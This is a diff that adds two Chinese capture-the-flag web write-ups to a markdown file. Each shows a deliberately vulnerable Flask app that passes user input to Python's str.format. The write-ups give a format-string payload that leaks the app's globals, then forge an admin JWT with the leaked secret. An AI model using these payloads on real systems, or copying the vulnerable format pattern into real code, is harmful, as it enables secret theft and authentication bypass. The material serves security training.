@@ -225,6 +225,148 @@ $(function () {
 
 访问后就可以得到 flag 了。
 
+### 地狱通讯
+
+```python
+from flask import Flask, render_template, request
+from flag import flag, FLAG
+import datetime
+
+app = Flask(__name__)
+
+
+@app.route("/", methods=['GET', 'POST'])
+def index():
+    f = open("app.py", "r")
+    ctx = f.read()
+    f.close()
+    f1ag = request.args.get('f1ag') or ""
+    exp = request.args.get('exp') or ""
+    flAg = FLAG(f1ag)
+    message = "Your flag is {0}" + exp
+    if exp == "":
+        return ctx
+    else:
+        return message.format(flAg)
+
+
+if __name__ == "__main__":
+    app.run()
+```
+
+根据以下 Python 代码
+
+```python
+exp = '{0.__class__} {1.__class__}'
+message = "{0} {1}" + exp
+str1 = 'string'
+str2 = 123
+print(message)
+print(message.format(str1, str2))
+# {0} {1}{0.__class__} {1.__class__}
+# string 123<class 'str'> <class 'int'>
+```
+
+再通过题目中给的 `message.format(flAg)` ，因此该题考的就是 format 格式化字符串。通过构造 Payload 如下
+
+```
+exp={0.__class__}
+```
+
+得到回显 `Your flag is <class 'flag.FLAG'>` ，说明 FLAG 是个类，再通过 `FLAG(f1ag)` 可以推断出存在构造函数，因此通过构造 Payload 如下
+
+```
+exp={0.__class__.__init__.__globals__}
+```
+
+就可以读取到 flag 力！
+
+### 地狱通讯-改
+
+拿到题目后先对代码进行格式化（
+
+```python
+from flask import Flask, render_template, request, session, redirect, make_response
+from secret import secret, headers, User
+import datetime
+import jwt
+
+app = Flask(__name__)
+
+
+@app.route("/", methods=['GET', 'POST'])
+def index():
+    f = open("app.py", "r")
+    ctx = f.read()
+    f.close()
+    res = make_response(ctx)
+    name = request.args.get('name') or ''
+    if 'admin' in name or name == '':
+        return res
+    payload = {"name": name, }
+    token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
+    res.set_cookie('token', token)
+    return res
+
+
+@app.route('/hello', methods=['GET', 'POST'])
+def hello():
+    token = request.cookies.get('token')
+    if not token:
+        return redirect('/', 302)
+    try:
+        name = jwt.decode(token, secret, algorithms=['HS256'])['name']
+    except jwt.exceptions.InvalidSignatureError as e:
+        return "Invalid token"
+    if name != "admin":
+        user = User(name)
+        flag = request.args.get('flag') or ''
+        message = "Hello {0}, your flag is" + flag
+        return message.format(user)
+    else:
+        return render_template('flag.html', name=name)
+
+
+if __name__ == "__main__":
+    app.run()
+```
+
+该题需要得到 `jwt` 为 `admin` 来获取 flag，在生成 `jwt` 的前提是获取 `secret` 和 `headers` ，先随便传入一个 name 来获取 `jwt` ，Payload 如下
+
+```
+name=K1sARa
+```
+
+可以得到 token 如下
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+```
+
+在 `/hello` 中可以通过跟上题一样的 Python 格式化字符串来获取 `secret` 和 `headers` 的值，构造的 Payload 如下
+
+```
+flag={0.__class__.__init__.__globals__}
+```
+
+通过回显可以得到 `secret` 的值为 `u_have_kn0w_what_f0rmat_i5` ， `headers` 的值为 `{'alg': 'HS256', 'typ': 'JWT'}` 。
+
+通过以下代码
+
+```python
+import jwt
+
+print(jwt.encode({
+    'name': 'admin'
+}, 'u_have_kn0w_what_f0rmat_i5', algorithm='HS256', headers= {
+    'alg': 'HS256',
+    'typ': 'JWT'
+}))
+# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4ifQ.jlAcmWWxtmNLxbxwfRE45Fxf16dX6LQmrK_1dgx7zmg
+```
+
+可以得到用户名为 `admin` 的 token，通过这个 token 作为 Cookie 再去访问 `/hello` 就可以得到 flag 力！
+
 ## Misc
 
 ### misc入门指北
